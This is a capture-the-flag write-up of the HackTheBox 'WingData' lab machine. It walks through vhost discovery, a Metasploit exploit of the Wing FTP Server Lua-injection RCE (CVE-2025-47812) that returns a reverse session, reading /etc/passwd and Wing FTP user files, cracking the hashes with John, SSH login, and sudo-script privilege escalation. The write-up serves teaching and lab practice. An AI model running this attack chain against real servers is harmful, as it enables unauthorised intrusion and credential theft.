# HackTheBox — WingData Write-up

| | |
|---|---|
| **Platform** | HackTheBox |
| **Machine** | WingData |
| **OS** | Linux |
| **Domain** | `wingdata.htb` |
| **Focus** | VHost discovery, Wing FTP Server RCE (CVE-2025-47812), credential extraction & cracking, sudo script privilege escalation |

> Educational write-up of a HackTheBox lab machine. Substitute your own target IP and tun0 address where shown.

---

## 1. Reconnaissance

Map the host first, then enumerate:

```bash
sudo subl /etc/hosts        # add: <target-ip>  wingdata.htb
```

Run directory and vhost discovery against the main site:

```bash
gobuster dir   -u http://wingdata.htb -w <wordlist>
gobuster vhost -u http://wingdata.htb -w <subdomain-wordlist> --append-domain
```

The main site itself yields nothing useful directly. However, the page has a **Client Panel** link, and clicking it redirects to:

```
http://ftp.wingdata.htb
```

Add that subdomain to `/etc/hosts` as well:

```
<target-ip>  wingdata.htb ftp.wingdata.htb
```

---

## 2. Fingerprinting the FTP Web Service

Opening `http://ftp.wingdata.htb` reveals a **Wing FTP Server** web interface, version **7.4.3**.

That version is affected by a critical vulnerability — **CVE-2025-47812**.

> **CVE-2025-47812** affects Wing FTP Server versions prior to the patched release. It stems from improper handling of **NULL bytes** in the `/loginok.html` endpoint when processing the `username` parameter, allowing injection of arbitrary **Lua** code into the user session file. Successful exploitation lets an **unauthenticated** attacker execute arbitrary commands on the server — as `root` on Linux (or `NT AUTHORITY\SYSTEM` on Windows).

---

## 3. Foothold — Exploiting CVE-2025-47812

The cleanest route is the Metasploit module for this CVE.

```bash
msfconsole
```

```
msf6 > search cve-2025-47812
msf6 > use <module-path-from-search>
msf6 > set RHOSTS ftp.wingdata.htb
msf6 > set LHOST tun0
msf6 > set LPORT 4444
msf6 > run
```

The exploit fires the Lua injection and returns a session.

### Stabilize the shell

Upgrade the basic session to an interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 4. Local Enumeration

Inspect local accounts:

```bash
cat /etc/passwd
```

```
wacky:x:1001:1001::/home/wacky:/bin/bash
```

The `wacky` account is the next target. Wing FTP stores its per-user configuration (including credential material) under its data directory:

```bash
cd /opt/wftpserver/Data/1/users
ls -al
```

```
anonymous.xml
john.xml
maria.xml
steve.xml
wacky.xml
```

Each `.xml` file holds a user's stored password hash.

---

## 5. Cracking the Hashes

Pull the password hash out of each `*.xml` user-config file and collect them:

```bash
# copy each hash value into hashes.txt
cat *.xml | grep -i password    # locate the hash field in each file
```

Then crack with John (or hashcat) against `rockyou`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# or:  hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
```

This recovers a valid plaintext password (notably for `wacky`).

---

## 6. User Access

Use the cracked credentials to log in over SSH:

```bash
ssh wacky@wingdata.htb
```

From here the **user flag** is readable in the user's home directory.

---

## 7. Privilege Escalation

Check sudo rights:

```bash
sudo -l
```

`wacky` can run a custom binary/script as root — something under `/usr/bin/` that looks out of place. Inspect it:

```bash
cat /usr/bin/<sudo-allowed-script>
```

It turns out to be a **Python 3 script**. Review its logic for an exploitable flaw — common patterns in these custom root scripts include:

- importing a module from a writable path (hijack via `PYTHONPATH` or a local module file),
- calling out to a subprocess/command without an absolute path (`$PATH` hijack),
- reading from or writing to an attacker-controllable file,
- `eval`/`exec` on user-influenced input.

Abuse whichever weakness the script exposes while it runs as root to obtain a root shell, after which the **root flag** is accessible.


